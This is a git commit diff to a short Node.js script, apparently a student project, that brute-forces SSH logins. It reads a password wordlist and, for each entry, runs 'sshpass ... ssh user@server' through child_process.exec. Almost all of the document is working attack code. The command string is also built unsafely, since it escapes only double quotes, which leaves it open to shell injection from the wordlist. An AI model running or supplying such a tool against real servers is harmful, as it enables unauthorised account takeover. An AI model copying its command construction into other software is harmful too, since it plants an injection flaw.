9be23f58be5aa4b65e784d7894c43832775b4248
Luciano Hanna El Adji <lucianohanna@id.uff.br>
2022-12-08 05:41:04 -0300

    Substiui por sshpass

--- index.js
+++ index.js
@@ -1,24 +1,24 @@
-const { NodeSSH } = require('node-ssh')
-const ssh = new NodeSSH()
-
 const fs = require('fs')
 const readline = require('readline')
+const {exec} = require('child_process')
 
 if (process.argv.length < 5) {
     console.log(`Usage: ${process.argv[1]} username server wordlist`)
     process.exit(1)
-
 }
+
+process.on('uncaughtException', (e) => console.error(e));
+
 const rl = readline.createInterface({
     input: fs.createReadStream(process.argv[4]),
     crlfDelay: Infinity
-  });
+});
 
 rl.on('line', (password) => {
-    ssh
-        .connect({
-            host: process.argv[3],
-            username: process.argv[2],
-            passphrase: password
-        })
+    console.log(`Trying ${password}`)
+
+    exec(
+	    'sshpass -p "' + password.replaceAll('"', '\\"') + `" ssh ${process.argv[2]}@${process.argv[3]}`,
+	    (err, stdout, stderr) => {if (err) console.error(err)}
+    )
 })
